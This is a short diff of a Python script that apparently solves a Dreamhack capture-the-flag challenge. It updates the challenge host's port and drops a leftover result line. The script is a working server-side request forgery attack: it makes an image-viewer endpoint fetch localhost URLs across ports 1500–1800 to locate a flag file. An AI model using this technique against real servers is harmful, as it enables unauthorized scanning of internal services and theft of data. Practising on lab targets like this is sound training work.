@@ -2,7 +2,7 @@ import requests
 
 no = 'iVBORw0KGg'
 for port in range(1500, 1801):
-    url = 'http://host3.dreamhack.games:10795/img_viewer'
+    url = 'http://host3.dreamhack.games:15346/img_viewer'
     image_url= 'http://Localhost:'+str(port)+'/flag.txt'
     data = { "url" : image_url }
     response = requests.post(url, data).text
@@ -12,4 +12,3 @@ for port in range(1500, 1801):
         print(str(port), 'find')
         break
 
-    http://Localhost:1669/flag.txt
